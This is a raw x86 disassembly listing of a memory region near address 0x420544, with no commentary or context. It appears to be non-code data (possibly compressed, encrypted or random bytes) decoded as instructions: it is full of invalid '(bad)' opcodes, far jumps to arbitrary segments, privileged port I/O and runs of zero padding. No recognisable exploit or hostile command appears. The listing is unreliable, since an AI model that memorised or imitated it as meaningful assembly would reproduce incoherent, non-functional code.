  420544:	call   0xb054:0xfd68352d
  42054b:	adc    esp,DWORD PTR [ebp+0x6a9321e4]
  420551:	inc    ecx
  420552:	aad    0x59
  420554:	popa   
  420555:	jno    0x420569
  420557:	cdq    
  420558:	xor    DWORD PTR [ebx],ebp
  42055a:	outs   dx,DWORD PTR ds:[esi]
  42055b:	pop    ds
  42055c:	adc    edx,eax
  42055e:	(bad)  
  42055f:	xor    al,0x2d
  420561:	inc    ebp
  420562:	jg     0x42055b
  420564:	push   edx
  420565:	xchg   ebp,eax
  420566:	loopne 0x420554
  420568:	sub    al,0x4b
  42056a:	call   0x822e1c7a
  42056f:	mov    ecx,0x788f5bf5
  420574:	in     eax,dx
  420575:	adc    DWORD PTR [eax+0xf00a60c],esi
  42057b:	test   al,0x8a
  42057d:	(bad)  
  42057e:	cwde   
  42057f:	mov    cl,0x6c
  420581:	xor    al,0x4
  420583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420584:	cmp    DWORD PTR [eax],ebp
  420586:	inc    eax
  420587:	sbb    DWORD PTR [edi+esi*2],ebp
  42058a:	xor    al,0xa0
  42058c:	mov    esp,0x2fd252e9
  420591:	cs pushf 
  420593:	push   0xcc2cd558
  420598:	or     cl,BYTE PTR [edx]
  42059a:	repz sbb eax,0x57749a7d
  4205a0:	cmp    al,0xdc
  4205a2:	fcmovne st,st(1)
  4205a4:	inc    esi
  4205a5:	add    al,BYTE PTR [eax]
  4205a7:	mov    cl,0x7e
  4205a9:	xchg   edx,eax
  4205aa:	jae    0x42060c
  4205ac:	inc    edx
  4205ad:	mov    ebx,0xa8a56d4d
  4205b2:	fsubr  QWORD PTR [edi+0x32415683]
  4205b8:	or     eax,0xb37f50ed
  4205bd:	sahf   
  4205be:	adc    BYTE PTR [esi+0x30936200],ah
  4205c4:	xchg   esi,eax
  4205c5:	fcom   st(5)
  4205c7:	je     0x4205de
  4205c9:	cmp    esi,DWORD PTR [ecx+0x2ff36502]
  4205cf:	aas    
  4205d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205d1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4205d3:	aaa    
  4205d4:	mov    eax,0xc0b217ff
  4205d9:	mov    esp,0x531d4d3a
  4205de:	call   FWORD PTR [ebp+0x70c1a883]
  4205e4:	pop    edx
  4205e5:	pop    esp
  4205e6:	jle    0x420598
  4205e8:	xor    dh,ah
  4205ea:	cmp    ebx,DWORD PTR [edi-0x4d11e35f]
  4205f0:	loopne 0x4205a9
  4205f2:	add    al,0x2d
  4205f4:	retf   0x15fe
  4205f7:	std    
  4205f8:	nop
  4205f9:	inc    edi
  4205fa:	test   DWORD PTR [ecx-0x7],edx
  4205fd:	mov    edi,DWORD PTR [edi-0x68]
  420600:	adc    BYTE PTR [esi+ebx*2-0x4173832d],dh
  420607:	scas   eax,DWORD PTR es:[edi]
  420608:	int    0x79
  42060a:	scas   eax,DWORD PTR es:[edi]
  42060b:	stos   DWORD PTR es:[edi],eax
  42060c:	inc    edx
  42060d:	and    al,0x28
  42060f:	sub    DWORD PTR [ebp+0x0],eax
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	pop    edi
  420681:	loope  0x420641
  420683:	aas    
  420684:	jne    0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0x4c000001
  42068d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42068e:	or     dh,dh
  420690:	rcr    BYTE PTR [edx-0x62b02a2d],1
  420696:	mov    ds:0x9051fa4c,eax
  42069b:	xor    dh,BYTE PTR [edx]
  42069d:	push   esi
  42069e:	ror    BYTE PTR [eax-0xe12749e],1
  4206a4:	dec    edi
  4206a5:	fisubr WORD PTR [esi*1-0x13ba0176]
  4206ac:	or     BYTE PTR [ecx],ah
  4206ae:	sahf   
  4206af:	(bad)  
  4206b0:	aad    0x28
  4206b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b3:	or     cl,BYTE PTR [edx]
  4206b5:	iret   
  4206b6:	dec    eax
  4206b7:	dec    esp
  4206b8:	jno    0x4206ab
  4206ba:	lea    esp,[ebp+0x5116613]
  4206c0:	test   dh,0xa3
  4206c3:	(bad)  
  4206c4:	cli    
  4206c5:	(bad)  
  4206c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206c7:	dec    esp
  4206c8:	fnstenv [edi]
  4206ca:	and    eax,0x72824078
  4206cf:	mov    esi,0x94a36c88
  4206d4:	bound  esp,QWORD PTR [ebp-0x11]
  4206d7:	addr16 ret 
  4206d9:	dec    edi
  4206da:	sub    al,0x64
  4206dc:	ret    0xdd70
  4206df:	or     esp,DWORD PTR [edi+0x7]
  4206e2:	push   esp
  4206e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206e4:	mov    bl,0x64
  4206e6:	enter  0x165a,0x64
  4206ea:	fistp  WORD PTR [ebp+0x55]
  4206ed:	push   ss
  4206ee:	mov    ecx,0x9c5cba88
  4206f3:	and    DWORD PTR [ecx+eax*8],eax
  4206f6:	sbb    eax,0x7d15126d
  4206fb:	out    dx,al
  4206fc:	enter  0x58f9,0xd0
  420700:	dec    edx
  420701:	pop    eax
  420702:	push   cs
  420703:	dec    esi
  420704:	gs fwait
  420706:	icebp  
  420707:	in     eax,0x7f
  420709:	sub    ch,ah
  42070b:	mov    esp,0xa27e3ba
  420710:	mov    edx,0x35ef1cac
  420715:	and    al,0x77
  420717:	push   edi
  420718:	xchg   ebx,eax
  420719:	adc    eax,0xbc7089b1
  42071e:	lds    esp,FWORD PTR [ebx+0x45]
  420721:	adc    ch,BYTE PTR [edx-0xcfc7852]
  420727:	rcl    DWORD PTR [ebp+0xe72f4e7],1
  42072d:	test   al,0x1e
  42072f:	clc    
  420730:	aam    0x0
  420732:	push   esp
  420733:	jb     0x42079b
  420735:	in     eax,0x53
  420737:	mov    eax,0x8e6a31f3
  42073c:	pop    eax
  42073d:	cwde   
  42073e:	clc    
  42073f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420740:	sbb    DWORD PTR [edx+0x68],ebp
  420743:	test   cl,al
  420745:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  420747:	mov    ds:0x3ff5dbda,al
  42074c:	in     al,dx
  42074d:	test   BYTE PTR ds:0x685a8223,al
  420753:	sub    DWORD PTR [ebp-0x18878af4],ebp
  420759:	cs into 
  42075b:	(bad)  
  42075c:	sbb    al,0x62
  42075e:	inc    eax
  42075f:	inc    ebx
  420760:	dec    esp
  420761:	pop    esi
  420762:	aam    0x5a
  420764:	rol    BYTE PTR [edi-0x36],0x19
  420768:	mov    ebp,0x39d1177b
  42076d:	das    
  42076e:	xchg   edx,eax
  42076f:	push   esi
  420770:	pop    es
  420771:	mov    bl,0x8f
  420773:	es xor eax,0x587af798
  420779:	popa   
  42077a:	mov    eax,0xed03eb1
  42077f:	rol    DWORD PTR [edi+ebp*1+0x29],0x40
  420784:	xlat   BYTE PTR ds:[ebx]
  420785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420786:	xchg   ecx,eax
  420787:	xchg   edi,eax
  420788:	hlt    
  420789:	mov    al,ds:0xde56fefb
  42078e:	pushw  0x55
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	mov    edx,0x7ab70c1d
  420805:	pop    edx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x4b000001
  42080d:	jae    0x4207a8
  42080f:	mov    DWORD PTR [eax+eax*4-0x56c448aa],ebx
  420816:	imul   edx,ecx,0x1ddaab9d
  42081c:	(bad)  [eax]
  42081e:	pop    esi
  42081f:	out    0xa5,eax
  420821:	setb   BYTE PTR ds:0x3d69faba
  420828:	popf   
  420829:	and    eax,0xad4399f7
  42082e:	push   ds
  42082f:	fisttp WORD PTR [edi]
  420831:	outs   dx,DWORD PTR ds:[esi]
  420832:	push   es
  420833:	mov    ds:0x70f0953c,eax
  420838:	ret    
  420839:	in     al,dx
  42083a:	xchg   ebx,eax
  42083b:	cwde   
  42083c:	cmp    BYTE PTR [edx+eiz*1],ch
  42083f:	pop    esp
  420840:	cmc    
  420841:	dec    dl
  420843:	or     BYTE PTR [ebp+esi*2+0x5f],0x4a
  420848:	xor    DWORD PTR [ecx],esp
  42084a:	jp     0x4207e8
  42084c:	addr16 out dx,al
  42084e:	jmp    0xd9f6:0x9886c43e
  420855:	mov    ch,0xe5
  420857:	sbb    al,0xa2
  42085a:	retf   
  42085b:	cld    
  42085c:	fild   WORD PTR [edx+0x4e]
  42085f:	test   DWORD PTR [ebx-0x73],edi
  420862:	mov    edi,0xa20143c6
  420867:	cdq    
  420868:	inc    ebp
  420869:	mov    ch,BYTE PTR [edx]
  42086b:	xchg   ebx,eax
  42086c:	fwait
  42086d:	jns    0x4208d0
  42086f:	adc    eax,0xf94f7c66
  420874:	das    
  420875:	(bad)
  420878:	ja     0x420866
  42087a:	xchg   BYTE PTR [esp+edi*4-0x7399318a],cl
  420881:	ja     0x42089f
  420883:	test   eax,0x62d83454
  420888:	mov    eax,es
  42088a:	ins    BYTE PTR es:[edi],dx
  42088b:	ret    0x7546
  42088e:	rcl    BYTE PTR [ecx+0x6d],0x59
  420892:	xchg   BYTE PTR ds:0x548944b3,dl
  420898:	adc    eax,0x8336dd1f
  42089d:	in     al,0x6b
  42089f:	jae    0x420899
  4208a1:	aam    0xd8
  4208a3:	lahf   
  4208a4:	xor    eax,0x51cc5d54
  4208a9:	mov    gs,WORD PTR [ecx-0x6f5078a2]
  4208af:	rcr    ecx,cl
  4208b1:	aad    0x4e
  4208b3:	clc    
  4208b4:	repz jmp 0xa1e53290
  4208ba:	sub    esp,0x4e181d6
  4208c0:	jle    0x420872
  4208c2:	fidiv  WORD PTR [eax+0x14]
  4208c5:	add    bh,0x43
  4208c8:	pop    eax
  4208c9:	sub    DWORD PTR [esi+0x4205ac97],edi
  4208cf:	pushf  
  4208d0:	ss (bad) 
  4208d2:	or     eax,0x333bb55f
  4208d7:	stos   DWORD PTR es:[edi],eax
  4208d8:	xchg   BYTE PTR [ebx+ebp*2-0x6f],bh
  4208dc:	stos   DWORD PTR es:[edi],eax
  4208dd:	mov    cl,0x79
  4208df:	jg     0x42089f
  4208e1:	add    BYTE PTR [eax-0x7ecf34e4],bh
  4208e7:	dec    esp
  4208e8:	xor    BYTE PTR [edi],dh
  4208ea:	std    
  4208eb:	mov    ah,dl
  4208ed:	mov    cl,0x47
  4208ef:	daa    
  4208f0:	adc    eax,0xe3d1de99
  4208f5:	inc    esi
  4208f6:	sbb    eax,0x7199824
  4208fb:	loopne 0x420951
  4208fd:	sub    eax,ebx
  4208ff:	mov    ah,0xc5
  420901:	jne    0x420889
  420903:	call   0xe4d2:0x46efd2ba
  42090a:	arpl   WORD PTR [ebx],ax
  42090c:	retf   
  42090d:	nop
  42090e:	ret    
  42090f:	add    dh,BYTE PTR [edi+0x0]
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xfd
  420981:	xor    DWORD PTR [edx],ecx
  420983:	jno    0x420a04
  420985:	pop    ebx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x62000001
  42098d:	jle    0x4209e4
  42098f:	mov    ds:0x264b1b83,al
  420994:	test   al,0x58
  420996:	cli    
  420997:	aaa    
  420998:	pop    edx
  420999:	daa    
  42099a:	jo     0x4209b6
  42099c:	xchg   esp,eax
  42099d:	push   ds
  42099e:	lods   al,BYTE PTR ds:[esi]
  42099f:	push   ds
  4209a0:	outs   dx,BYTE PTR ds:[esi]
  4209a1:	mov    dh,BYTE PTR [ecx]
  4209a3:	iret   
  4209a4:	js     0x4209e6
  4209a6:	sbb    eax,DWORD PTR [esi-0x5c618d34]
  4209ac:	sub    ecx,0x5f
  4209af:	inc    ebp
  4209b0:	mov    ah,0x1d
  4209b2:	in     al,0xcf
  4209b4:	push   edx
  4209b5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209b7:	outs   dx,DWORD PTR ds:[esi]
  4209b8:	stos   DWORD PTR es:[edi],eax
  4209b9:	pop    esp
  4209ba:	cdq    
  4209bb:	dec    esp
  4209bc:	inc    esp
  4209bd:	aas    
  4209be:	xor    al,0xb1
  4209c0:	jne    0x420a3b
  4209c2:	popa   
  4209c3:	jmp    0x4209b5
  4209c5:	mov    al,0x7a
  4209c7:	xchg   esp,eax
  4209c8:	push   0x1ffb4ed8
  4209cd:	jo     0x420a36
  4209cf:	xor    bh,BYTE PTR [ebx+0x2f]
  4209d2:	addr16 mov al,ds:0x172a
  4209d6:	jmp    0xca385c2
  4209db:	adc    BYTE PTR [ecx+0x5daddb17],cl
  4209e1:	popa   
  4209e2:	in     al,0x44
  4209e4:	out    0xfd,al
  4209e6:	mov    BYTE PTR [esi+eiz*1+0x2fd04087],ah
  4209ed:	pop    ebp
  4209ee:	cmp    al,0x76
  4209f0:	clc    
  4209f1:	push   ebx
  4209f2:	inc    edi
  4209f3:	sub    al,0x35
  4209f5:	or     eax,0x60c2c7ab
  4209fa:	dec    ebx
  4209fb:	inc    eax
  4209fc:	xchg   ebp,eax
  4209fd:	clc    
  4209fe:	pop    edx
  4209ff:	psrad  mm7,mm3
  420a02:	dec    edx
  420a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a04:	jnp    0x4209b2
  420a06:	xor    bl,cl
  420a08:	sbb    eax,0x7b4b330
  420a0d:	cmp    eax,0xcdc643d0
  420a12:	mov    DWORD PTR [ebx+edx*8-0x4d],eax
  420a16:	sar    DWORD PTR [ebx-0x39],0x72
  420a1a:	lock in al,dx
  420a1c:	gs xor dh,dh
  420a1f:	or     ch,BYTE PTR [ebx+0x54d839da]
  420a25:	pop    ebp
  420a26:	loope  0x420a7e
  420a28:	dec    edi
  420a29:	or     DWORD PTR [eax-0x18],0x4a
  420a2d:	scas   al,BYTE PTR es:[edi]
  420a2e:	sub    DWORD PTR [ebx],ecx
  420a30:	sub    ebp,esi
  420a32:	loop   0x4209b8
  420a34:	mov    al,ah
  420a36:	idiv   BYTE PTR [ebx-0xe6263bf]
  420a3c:	sbb    al,cl
  420a3e:	or     ecx,DWORD PTR [ebx+0x416dacf0]
  420a44:	std    
  420a45:	(bad)  
  420a46:	jmp    edi
  420a48:	fcom   QWORD PTR [ecx]
  420a4a:	cwde   
  420a4b:	retf   
  420a4c:	imul   eax,DWORD PTR [edx-0x6653a32b],0xe6123514
  420a56:	rol    ch,0x3a
  420a59:	iret   
  420a5a:	sbb    BYTE PTR [edi+0x63],ah
  420a5d:	cmp    esp,ebp
  420a5f:	mov    dh,0x7
  420a61:	data16 jne 0x420a1e
  420a64:	add    edi,esp
  420a66:	clc    
  420a67:	int3   
  420a68:	add    al,0xf9
  420a6a:	ins    DWORD PTR es:[edi],dx
  420a6b:	ret    
  420a6c:	push   es
  420a6d:	pop    edx
  420a6e:	jecxz  0x420ac2
  420a70:	adc    DWORD PTR [ebx+0x19],0x419f4bce
  420a77:	fiadd  WORD PTR [esi+0x49833049]
  420a7d:	repz rol dh,1
  420a80:	and    dl,bh
  420a82:	xchg   ebx,eax
  420a83:	jns    0x420a5b
  420a85:	scas   al,BYTE PTR es:[edi]
  420a86:	push   edi
  420a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a88:	ret    0xac76
  420a8b:	cmpxchg DWORD PTR [eax+eiz*8],edi
  420a8f:	rcl    BYTE PTR [ebx+0x0],1
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	add    al,0x55
  420b02:	mov    edi,DWORD PTR [ebx]
  420b04:	test   BYTE PTR [ecx+eax*1+0x0],bl
  420b08:	add    eax,0x4e000001
  420b0d:	jno    0x420b4a
  420b0f:	dec    edx
  420b10:	mov    bl,0xcc
  420b12:	fnstsw WORD PTR [ecx+0x5ae7771d]
  420b18:	sbb    BYTE PTR [ecx+eax*1],bl
  420b1b:	dec    ebp
  420b1c:	mov    ebp,0xb5379908
  420b21:	fwait
  420b22:	add    al,0x7
  420b24:	mov    al,ds:0xe38e0013
  420b29:	sbb    ebp,DWORD PTR [ebx+eiz*1+0x69]
  420b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b2e:	icebp  
  420b2f:	fisttp QWORD PTR [ecx-0x39]
  420b32:	iret   
  420b33:	inc    esi
  420b34:	push   edi
  420b35:	xchg   edx,eax
  420b36:	clc    
  420b37:	retf   0x7674
  420b3a:	call   0x8f4bf095
  420b3f:	mov    bh,BYTE PTR [ebx+0x6f]
  420b42:	arpl   WORD PTR [edi-0x4a9b0ccb],si
  420b48:	or     al,0xeb
  420b4a:	sbb    DWORD PTR ds:0x52295637,0x43
  420b51:	fwait
  420b52:	mov    edi,0xa55ee75f
  420b57:	xchg   ecx,eax
  420b58:	mov    ds:0x773ead62,eax
  420b5d:	mov    cl,0xa8
  420b5f:	add    ch,0xe5
  420b62:	jecxz  0x420b22
  420b64:	add    cl,0x1c
  420b67:	into   
  420b68:	push   eax
  420b69:	push   0xef9d0354
  420b6e:	and    eax,0x90b2a616
  420b73:	pop    ss
  420b74:	mov    esi,0x1dea064b
  420b79:	xchg   ebp,eax
  420b7a:	arpl   WORD PTR [ebp+eax*1+0xc7f8963],sp
  420b81:	push   eax
  420b82:	out    0xfc,eax
  420b84:	addr16 pop ecx
  420b86:	outs   dx,DWORD PTR ds:[esi]
  420b87:	fcom   DWORD PTR [edi]
  420b89:	sbb    DWORD PTR [ecx-0x78476039],ebx
  420b8f:	gs inc edx
  420b91:	add    al,0xcc
  420b93:	lea    edi,[eax-0x7b]
  420b96:	sub    al,0xb6
  420b98:	cmp    al,0x8e
  420b9a:	out    dx,eax
  420b9b:	sbb    esp,DWORD PTR [edx+0x4f]
  420b9e:	inc    esp
  420b9f:	test   eax,0x7457f69
  420ba4:	lds    ebp,FWORD PTR [eax]
  420ba6:	jns    0x420b8a
  420ba8:	pop    ebx
  420ba9:	push   ss
  420baa:	dec    edi
  420bab:	and    ebx,ebp
  420bad:	cdq    
  420bae:	mov    BYTE PTR [ecx],dh
  420bb0:	je     0x420bf7
  420bb2:	pop    eax
  420bb3:	call   0x716a1949
  420bb8:	inc    edi
  420bb9:	in     al,dx
  420bba:	sahf   
  420bbb:	lock xor eax,0x2354950f
  420bc1:	push   esi
  420bc2:	inc    esp
  420bc3:	pop    ds
  420bc4:	push   ebp
  420bc5:	out    0x5d,eax
  420bc7:	jp     0x420b62
  420bc9:	stos   DWORD PTR es:[edi],eax
  420bca:	mov    dl,0xcc
  420bcc:	(bad)  
  420bcd:	mov    dh,BYTE PTR [eax+0x69e0338f]
  420bd3:	bound  ebp,QWORD PTR [esi]
  420bd5:	mov    al,ds:0x7205a3e1
  420bda:	out    0x29,al
  420bdc:	in     al,0xc4
  420bde:	and    al,0x34
  420be0:	jne    0x420b76
  420be2:	fwait
  420be3:	jne    0x420bd0
  420be5:	push   ecx
  420be6:	bt     DWORD PTR [esi+0x6c5fcd00],esi
  420bed:	pushf  
  420bee:	cmp    al,0x49
  420bf0:	push   ecx
  420bf1:	dec    eax
  420bf2:	shl    BYTE PTR [edi-0x4a],1
  420bf5:	jmp    0xd8a6:0x16b77c44
  420bfc:	inc    eax
  420bfd:	js     0x420bb8
  420bff:	and    dl,BYTE PTR [esi]
  420c01:	dec    ecx
  420c02:	je     0x420bd2
  420c04:	xchg   edx,eax
  420c05:	mov    eax,0xee62bac1
  420c0a:	(bad)  
  420c0b:	jmp    FWORD PTR [ebp+0x3359e1f3]
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	data16 test bl,ch
  420c83:	loop   0x420c0e
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x74000001
  420c8d:	loopne 0x420cb9
  420c8f:	(bad)  
  420c91:	das    
  420c92:	loop   0x420cfc
  420c94:	push   es
  420c95:	daa    
  420c96:	dec    sp
  420c98:	jmp    0x420c1b
  420c9a:	test   BYTE PTR [esi+0x1ebbe8fd],0x7d
  420ca1:	jp     0x420cbd
  420ca3:	mov    esi,0x1e71da2d
  420ca8:	adc    edi,DWORD PTR [edi-0x62a338fe]
  420cae:	or     al,0x6b
  420cb0:	xchg   edx,eax
  420cb1:	xor    BYTE PTR [esi],dl
  420cb3:	pop    ds
  420cb4:	pop    ds
  420cb5:	inc    ebp
  420cb6:	cld    
  420cb7:	add    eax,0xc2d1afbd
  420cbc:	jo     0x420cad
  420cbe:	xor    esp,DWORD PTR [esi-0x5e]
  420cc1:	fsub   QWORD PTR [eax-0x6a31d8f1]
  420cc7:	jp     0x420cbd
  420cc9:	jns    0x420d01
  420ccb:	push   edi
  420ccc:	and    BYTE PTR [edx+0xa],dh
  420ccf:	or     al,0xf4
  420cd1:	sub    edx,edx
  420cd3:	dec    edx
  420cd4:	retf   0x2bdb
  420cd7:	nop
  420cd8:	and    DWORD PTR [eax],0xafbd38ed
  420cde:	lahf   
  420cdf:	or     DWORD PTR [edi],ebx
  420ce1:	out    dx,al
  420ce2:	and    eax,0xd8ecf5f4
  420ce7:	cmc    
  420ce8:	(bad)  
  420cea:	mov    ds:0x173b56ad,al
  420cef:	js     0x420c96
  420cf1:	xor    DWORD PTR [eax-0x51],0x46bd4c0c
  420cf8:	sbb    bl,BYTE PTR [eax-0x6464f335]
  420cfe:	pop    eax
  420cff:	retf   
  420d00:	add    al,0xf4
  420d02:	xchg   DWORD PTR [ebp-0x14e7bfac],edx
  420d08:	cli    
  420d09:	retf   0x15cc
  420d0c:	test   al,0x2
  420d0e:	(bad)  
  420d0f:	cmp    al,0x15
  420d11:	mov    DWORD PTR [edi-0x25],edi
  420d14:	scas   al,BYTE PTR es:[edi]
  420d15:	ret    0x772b
  420d18:	mov    ah,0xcb
  420d1a:	push   es
  420d1b:	imul   ebp,ecx,0xffffffe3
  420d1e:	sbb    DWORD PTR [edi-0x6374c567],ebp
  420d24:	dec    edi
  420d25:	ror    BYTE PTR [ecx+edx*1],0x82
  420d29:	xchg   ebp,eax
  420d2a:	inc    edx
  420d2b:	cwde   
  420d2c:	stc    
  420d2d:	scas   al,BYTE PTR es:[edi]
  420d2e:	xchg   ebx,eax
  420d2f:	sbb    eax,0xfa0ebbc8
  420d34:	xor    ah,cl
  420d36:	cmp    eax,0xb05026cb
  420d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3c:	pop    ss
  420d3d:	loope  0x420ce3
  420d3f:	ret    
  420d40:	or     ecx,eax
  420d42:	fwait
  420d43:	cmp    DWORD PTR [ebx+ebx*8-0x59ee7d45],0x60
  420d4b:	ins    BYTE PTR es:[edi],dx
  420d4c:	fwait
  420d4d:	hlt    
  420d4e:	add    eax,0x5ab94a92
  420d53:	mov    ah,0x17
  420d55:	test   edx,0xdd0ea1bb
  420d5b:	rcr    DWORD PTR ss:[ebx+0x322353e0],1
  420d62:	mul    DWORD PTR [esi-0x2f]
  420d65:	cmc    
  420d66:	mov    DWORD PTR [ebx],edx
  420d68:	sbb    eax,0xdc273c9e
  420d6d:	sub    ebx,DWORD PTR [eax+0x1039d04c]
  420d73:	sbb    BYTE PTR [ebp+0x3e],0x2f
  420d77:	mov    ecx,0x85c1834
  420d7c:	fwait
  420d7d:	retf   0x6193
  420d80:	jmp    DWORD PTR ds:0xdde6950c
  420d86:	mov    ds:0x88eded66,al
  420d8c:	cmp    eax,0x7dc36b65
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x51b5d13c
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x4d000001,al
  420e0d:	mov    ds:0xeac457b,eax
  420e12:	dec    eax
  420e13:	not    BYTE PTR [edx+0x1933af9d]
  420e19:	pop    ebx
  420e1a:	cs test al,0x46
  420e1d:	jno    0x420e0c
  420e1f:	(bad)  
  420e20:	imul   esp,ecx,0x578df0b8
  420e26:	aad    0x48
  420e28:	mov    bh,0x8f
  420e2a:	test   bl,al
  420e2c:	pop    eax
  420e2d:	gs mov dl,0x44
  420e30:	es retf 
  420e32:	inc    edx
  420e33:	mov    ecx,0x667d3b32
  420e38:	push   ebx
  420e39:	fnstsw WORD PTR [edi]
  420e3b:	adc    eax,0x250eefd
  420e40:	cld    
  420e41:	fucomi st,st(1)
  420e43:	iret   
  420e44:	add    al,0xf4
  420e46:	xchg   ebx,eax
  420e47:	imul   ebx,DWORD PTR [edi-0x28548024],0xcbe2c7f1
  420e51:	and    ecx,DWORD PTR [edx]
  420e53:	sbb    cl,BYTE PTR [ebp+0x58]
  420e56:	push   ds
  420e57:	pop    esp
  420e58:	jne    0x420e37
  420e5a:	pusha  
  420e5b:	adc    dl,BYTE PTR [esp+ebx*2]
  420e5e:	arpl   WORD PTR [edi+0xdfbaa82],bx
  420e64:	pop    edi
  420e65:	aaa    
  420e66:	fwait
  420e67:	in     eax,dx
  420e68:	add    ah,BYTE PTR [eax-0x68]
  420e6b:	aaa    
  420e6c:	mov    ebp,0xdd2075b4
  420e71:	sbb    eax,0x90079039
  420e76:	push   0x62516d39
  420e7b:	in     eax,dx
  420e7c:	stos   BYTE PTR es:[edi],al
  420e7d:	retf   0xa236
  420e80:	xchg   ebx,eax
  420e81:	sti    
  420e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e83:	fcom   DWORD PTR [edi+0x1abf07e5]
  420e89:	pop    edx
  420e8a:	call   0xc4aa61fd
  420e8f:	daa    
  420e90:	inc    edx
  420e91:	data16 jecxz 0x420f10
  420e94:	sub    bh,BYTE PTR [ecx+edi*8+0x29b10bff]
  420e9b:	ins    BYTE PTR es:[edi],dx
  420e9c:	call   0x202034d5
  420ea1:	repz (bad) 
  420ea4:	mov    dh,0x6f
  420ea6:	(bad)  
  420ea7:	cld    
  420ea8:	dec    edi
  420ea9:	pop    es
  420eaa:	in     al,dx
  420eab:	lods   eax,DWORD PTR ds:[esi]
  420eac:	push   edi
  420ead:	mov    ebp,0xf10e421c
  420eb2:	and    esp,DWORD PTR [esi+0x3b9d293]
  420eb8:	sbb    DWORD PTR [esi-0x24625d84],ebx
  420ebe:	adc    dh,bh
  420ec0:	fwait
  420ec1:	stos   BYTE PTR es:[edi],al
  420ec2:	dec    ebx
  420ec3:	fnsave [ebx+0x3541399]
  420ec9:	popf   
  420eca:	loopne 0x420f23
  420ecc:	adc    eax,0x1038a637
  420ed1:	sub    al,0x23
  420ed3:	fwait
  420ed4:	jmp    0x420ecb
  420ed6:	les    edx,FWORD PTR [ecx-0x7298fe5a]
  420edc:	test   edi,edi
  420ede:	sub    BYTE PTR [esp+eax*8],ch
  420ee1:	ret    
  420ee2:	retf   
  420ee3:	dec    edx
  420ee4:	std    
  420ee5:	jp     0x420ea9
  420ee7:	dec    edi
  420ee8:	ins    BYTE PTR es:[edi],dx
  420ee9:	fild   WORD PTR [edi+0x75]
  420eec:	and    DWORD PTR [esi+esi*4+0x76],edx
  420ef0:	lock sbb eax,0x246c9095
  420ef6:	repnz and BYTE PTR [ebx-0x2b],0x59
  420efb:	adc    esi,DWORD PTR ds:0xb91d3457
  420f01:	cwde   
  420f02:	(bad)  
  420f03:	(bad)  
  420f05:	sub    DWORD PTR [eax-0x1a656374],esp
  420f0b:	pop    es
  420f0c:	jne    0x420ec0
  420f0e:	mov    eax,0x1e4f
	...
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x11e1bfd7]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x93000001
  420f8d:	hlt    
  420f8e:	jns    0x420ffc
  420f90:	std    
  420f91:	push   esp
  420f92:	fstp   TBYTE PTR [ebx]
  420f94:	out    0xc2,eax
  420f96:	jmp    0x765d3095
  420f9b:	int    0x6f
  420f9d:	(bad)  
  420f9e:	jmp    0xf4c5fb53
  420fa3:	add    DWORD PTR [esi+0x5b],ecx
  420fa6:	ficom  WORD PTR [edi+0x34]
  420fa9:	lahf   
  420faa:	sub    ah,BYTE PTR [esi-0x60]
  420fad:	jmp    0x42100f
  420faf:	cmp    edx,DWORD PTR ds:0xce46cc77
  420fb5:	jp     0x420fbe
  420fb7:	jg     0x420fef
  420fb9:	cmp    ebp,esi
  420fbb:	inc    eax
  420fbc:	mov    WORD PTR ds:0xbe1ed97,ds
  420fc2:	leave  
  420fc3:	or     esp,edx
